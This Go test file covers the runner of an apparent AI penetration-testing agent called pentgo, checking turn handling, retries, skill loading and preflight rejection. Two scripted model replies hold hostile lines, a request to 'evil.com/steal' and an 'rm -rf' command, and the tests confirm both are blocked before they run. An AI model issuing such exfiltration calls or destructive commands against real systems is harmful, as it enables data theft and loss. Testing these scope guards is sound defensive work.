package runtime

import (
	"context"
	"errors"
	"strings"
	"testing"
	"time"

	"pentgo/internal/agent"
	"pentgo/skills"
)

func TestRunnerFeedsAssistantDecisionAndExecutionResultIntoNextTurn(t *testing.T) {
	client := &scriptedClient{responses: []agent.Response{
		{Content: "先收集响应。\n```python\nimport os\nprint('probe')\n```"},
		{Content: "TASK_COMPLETE\n已经根据执行结果完成。"},
	}}
	executor := &recordingExecutor{results: []ExecutionResult{{
		Block:    CodeBlock{Index: 1, Language: LanguagePython},
		Status:   ExecutionSucceeded,
		ExitCode: 0,
		Stdout:   "probe-result\n",
	}}}
	runner := NewRunner(client, executor, defaultRunnerConfig(), nil, nil)
	session := NewSession(Target{Canonical: "https://example.com"}, "检查目标", time.Now().UTC())

	if err := runner.Run(context.Background(), session); err != nil {
		t.Fatal(err)
	}
	if session.Status != SessionDone || session.StopReason != "task_complete" || session.Turn != 2 {
		t.Fatalf("session = %+v", session)
	}
	if len(client.requests) != 2 {
		t.Fatalf("request count = %d", len(client.requests))
	}
	second := client.requests[1].Messages
	if !containsMessage(second, "assistant", "先收集响应。\n```python\nimport os\nprint('probe')\n```") {
		t.Fatalf("assistant decision missing: %+v", second)
	}
	if !containsMessage(second, "user", "=== PENTGO EXECUTION RESULT ===\nturn: 1\nlanguage: python\nstatus: succeeded\nexit_code: 0\nstdout:\nprobe-result\nstderr:\n\n=== END PENTGO EXECUTION RESULT ===") {
		t.Fatalf("execution result missing: %+v", second)
	}
}

func TestRunnerRetriesProviderOnce(t *testing.T) {
	client := &scriptedClient{errors: []error{errors.New("temporary transport error")}, responses: []agent.Response{{Content: "```python\nimport os\nprint('evidence')\n```"}, {Content: "TASK_COMPLETE"}}}
	runner := NewRunner(client, &recordingExecutor{results: []ExecutionResult{{Block: CodeBlock{Index: 1, Language: LanguagePython}, Status: ExecutionSucceeded}}}, defaultRunnerConfig(), nil, func(context.Context, time.Duration) error { return nil })
	session := NewSession(Target{Canonical: "https://example.com"}, "检查目标", time.Now().UTC())

	if err := runner.Run(context.Background(), session); err != nil {
		t.Fatal(err)
	}
	if len(client.requests) != 3 || session.Status != SessionDone {
		t.Fatalf("requests/session = %d/%+v", len(client.requests), session)
	}
}

func TestRunnerStopsAfterConfiguredNoCodeLimit(t *testing.T) {
	client := &scriptedClient{responses: []agent.Response{{Content: "继续分析"}, {Content: "继续分析"}, {Content: "继续分析"}}}
	config := defaultRunnerConfig()
	config.NoCodeLimit = 3
	runner := NewRunner(client, &recordingExecutor{}, config, nil, nil)
	session := NewSession(Target{Canonical: "https://example.com"}, "检查目标", time.Now().UTC())

	if err := runner.Run(context.Background(), session); err != nil {
		t.Fatal(err)
	}
	if session.Status != SessionDone || session.StopReason != "no_executable_response" || session.Turn != 3 {
		t.Fatalf("session = %+v", session)
	}
}

func TestRunnerInjectsSkillContextOnlyOnce(t *testing.T) {
	client := &scriptedClient{responses: []agent.Response{{Content: "SKILL_LOAD: recon"}, {Content: "```python\nimport os\nprint('evidence')\n```"}, {Content: "TASK_COMPLETE"}}}
	loader := func(name string) (string, error) {
		if name != "recon" {
			t.Fatalf("skill = %q", name)
		}
		return "recon knowledge", nil
	}
	runner := NewRunner(client, &recordingExecutor{results: []ExecutionResult{{Block: CodeBlock{Index: 1, Language: LanguagePython}, Status: ExecutionSucceeded}}}, defaultRunnerConfig(), loader, nil)
	session := NewSession(Target{Canonical: "https://example.com"}, "检查目标", time.Now().UTC())

	if err := runner.Run(context.Background(), session); err != nil {
		t.Fatal(err)
	}
	if len(client.requests) != 3 || !containsMessage(client.requests[1].Messages, "user", "=== PENTGO SKILL CONTEXT ===\nskill: recon\nrecon knowledge\n=== END PENTGO SKILL CONTEXT ===") {
		t.Fatalf("requests = %+v", client.requests)
	}
}

func TestRunnerReturnsPreflightRejectionToModel(t *testing.T) {
	client := &scriptedClient{responses: []agent.Response{{Content: "```python\nprint('only text')\n```"}, {Content: "TASK_COMPLETE"}, {Content: "```python\nimport os\nprint('evidence')\n```"}, {Content: "TASK_COMPLETE"}}}
	runner := NewRunner(client, &recordingExecutor{results: []ExecutionResult{{Block: CodeBlock{Index: 1, Language: LanguagePython}, Status: ExecutionSucceeded}}}, defaultRunnerConfig(), nil, nil)
	session := NewSession(Target{Canonical: "https://example.com"}, "检查目标", time.Now().UTC())

	if err := runner.Run(context.Background(), session); err != nil {
		t.Fatal(err)
	}
	if len(client.requests) != 4 || !containsMessageFragment(client.requests[1].Messages, "user", "PREFLIGHT REJECTED") {
		t.Fatalf("requests = %+v", client.requests)
	}
}

func TestRunnerRequiresExecutionEvidenceBeforeCompletion(t *testing.T) {
	client := &scriptedClient{responses: []agent.Response{{Content: "TASK_COMPLETE"}, {Content: "```python\nimport os\nprint('evidence')\n```"}, {Content: "TASK_COMPLETE"}}}
	runner := NewRunner(client, &recordingExecutor{results: []ExecutionResult{{Block: CodeBlock{Index: 1, Language: LanguagePython}, Status: ExecutionSucceeded, Stdout: "evidence\n"}}}, defaultRunnerConfig(), nil, nil)
	session := NewSession(Target{Canonical: "https://example.com"}, "检查目标", time.Now().UTC())

	if err := runner.Run(context.Background(), session); err != nil {
		t.Fatal(err)
	}
	if len(client.requests) != 3 || !containsMessageFragment(client.requests[1].Messages, "user", "EVIDENCE REQUIRED") || session.Status != SessionDone {
		t.Fatalf("requests/session = %+v/%+v", client.requests, session)
	}
}

func TestRunnerReturnsMixedPreflightOutcomesToTheExecutorAndHistory(t *testing.T) {
	client := &scriptedClient{responses: []agent.Response{{Content: "```python\nprint('reject')\n```\n```bash\necho accepted\n```"}, {Content: "TASK_COMPLETE"}}}
	executor := &recordingExecutor{results: []ExecutionResult{
		{Block: CodeBlock{Index: 1, Language: LanguagePython}, Status: ExecutionPreflightRejected, ExitCode: -1, Error: "Python block has only print or placeholder code"},
		{Block: CodeBlock{Index: 2, Language: LanguageShell}, Status: ExecutionSucceeded, ExitCode: 0, Stdout: "accepted\n"},
	}}
	runner := NewRunner(client, executor, defaultRunnerConfig(), nil, nil)
	session := NewSession(Target{Canonical: "https://example.com"}, "检查目标", time.Now().UTC())

	if err := runner.Run(context.Background(), session); err != nil {
		t.Fatal(err)
	}
	if len(executor.inputs) != 1 || len(executor.inputs[0].Blocks) != 2 || executor.inputs[0].Blocks[0].Approved || !executor.inputs[0].Blocks[1].Approved {
		t.Fatalf("executor inputs = %+v", executor.inputs)
	}
	if !containsMessageFragment(client.requests[1].Messages, "user", "preflight_rejected") {
		t.Fatalf("history = %+v", client.requests[1].Messages)
	}
}

func TestRunnerInjectsSkillCatalogIntoSystemPrompt(t *testing.T) {
	client := &scriptedClient{responses: []agent.Response{
		{Content: "```python\nimport os\nprint('evidence')\n```"},
		{Content: "TASK_COMPLETE"},
	}}
	config := defaultRunnerConfig()
	config.SkillCatalog = []skills.Skill{{Name: "recon", Description: "信息收集方法论"}}
	runner := NewRunner(client, &recordingExecutor{results: []ExecutionResult{{Block: CodeBlock{Index: 1, Language: LanguagePython}, Status: ExecutionSucceeded, Stdout: "evidence\n"}}}, config, nil, nil)
	session := NewSession(Target{Canonical: "https://example.com"}, "检查目标", time.Now().UTC())

	if err := runner.Run(context.Background(), session); err != nil {
		t.Fatal(err)
	}
	if len(client.requests) == 0 {
		t.Fatal("no requests recorded")
	}
	prompt := client.requests[0].SystemPrompt
	if !strings.Contains(prompt, "recon") || !strings.Contains(prompt, "信息收集方法论") {
		t.Fatalf("system prompt missing catalog: %s", prompt)
	}
}

func TestRunnerBlocksOutOfScopeCodeBeforeExecution(t *testing.T) {
	client := &scriptedClient{responses: []agent.Response{
		{Content: "外联测试。\n```python\nimport requests\nrequests.get('https://evil.com/steal')\n```"},
		{Content: "```python\nimport requests\nrequests.get('https://example.com/status')\nprint('ok')\n```"},
		{Content: "TASK_COMPLETE"},
	}}
	executor := &recordingExecutor{results: []ExecutionResult{{
		Block: CodeBlock{Index: 1, Language: LanguagePython}, Status: ExecutionSucceeded, Stdout: "ok\n",
	}}}
	config := defaultRunnerConfig()
	config.Authorizer = NewAuthorizer(false)
	config.AllowPrivateHosts = true
	runner := NewRunner(client, executor, config, nil, nil)
	session := NewSession(Target{Canonical: "https://example.com"}, "检查目标", time.Now().UTC())

	if err := runner.Run(context.Background(), session); err != nil {
		t.Fatal(err)
	}
	if session.Status != SessionDone {
		t.Fatalf("session = %+v", session)
	}
	blocked := false
	for _, event := range session.Timeline {
		if event.Kind == "recovery" && event.Detail == "authorization_blocked" {
			blocked = true
		}
	}
	if !blocked {
		t.Fatalf("expected authorization_blocked timeline event: %+v", session.Timeline)
	}
	if len(client.requests) < 2 {
		t.Fatalf("request count = %d", len(client.requests))
	}
	if !containsMessageFragment(client.requests[1].Messages, "user", "out of authorized scope") {
		t.Fatalf("scope rejection not fed back: %+v", client.requests[1].Messages)
	}
}

func TestRunnerBlocksDestructiveCodeBeforeExecution(t *testing.T) {
	client := &scriptedClient{responses: []agent.Response{
		{Content: "```bash\nrm -rf /tmp/loot\n```"},
		{Content: "```python\nimport requests\nrequests.get('https://example.com/status')\nprint('ok')\n```"},
		{Content: "TASK_COMPLETE"},
	}}
	executor := &recordingExecutor{results: []ExecutionResult{{
		Block: CodeBlock{Index: 1, Language: LanguagePython}, Status: ExecutionSucceeded, Stdout: "ok\n",
	}}}
	config := defaultRunnerConfig()
	config.Authorizer = NewAuthorizer(false)
	runner := NewRunner(client, executor, config, nil, nil)
	session := NewSession(Target{Canonical: "https://example.com"}, "检查目标", time.Now().UTC())

	if err := runner.Run(context.Background(), session); err != nil {
		t.Fatal(err)
	}
	if !containsMessageFragment(client.requests[1].Messages, "user", "destructive") {
		t.Fatalf("destructive rejection not fed back: %+v", client.requests[1].Messages)
	}
}

type scriptedClient struct {
	responses []agent.Response
	errors    []error
	requests  []agent.Request
}

func (client *scriptedClient) Chat(_ context.Context, request agent.Request) (agent.Response, error) {
	copyRequest := request
	copyRequest.Messages = append([]agent.Message(nil), request.Messages...)
	client.requests = append(client.requests, copyRequest)
	if len(client.errors) > 0 {
		err := client.errors[0]
		client.errors = client.errors[1:]
		return agent.Response{}, err
	}
	response := client.responses[0]
	client.responses = client.responses[1:]
	return response, nil
}

type recordingExecutor struct {
	results []ExecutionResult
	inputs  []ExecutionInput
}

func (executor *recordingExecutor) Execute(_ context.Context, input ExecutionInput) []ExecutionResult {
	executor.inputs = append(executor.inputs, input)
	return executor.results
}

func defaultRunnerConfig() RunnerConfig {
	return RunnerConfig{MaxTurns: 8, NoCodeLimit: 3, ProviderRetryDelay: time.Millisecond, NetworkBackoff: time.Millisecond, SoftStuckTurns: 3, HardStuckTurns: 5}
}

func containsMessage(messages []agent.Message, role, content string) bool {
	for _, message := range messages {
		if message.Role == role && strings.TrimSpace(message.Content) == strings.TrimSpace(content) {
			return true
		}
	}
	return false
}

func containsMessageFragment(messages []agent.Message, role, fragment string) bool {
	for _, message := range messages {
		if message.Role == role && strings.Contains(message.Content, fragment) {
			return true
		}
	}
	return false
}
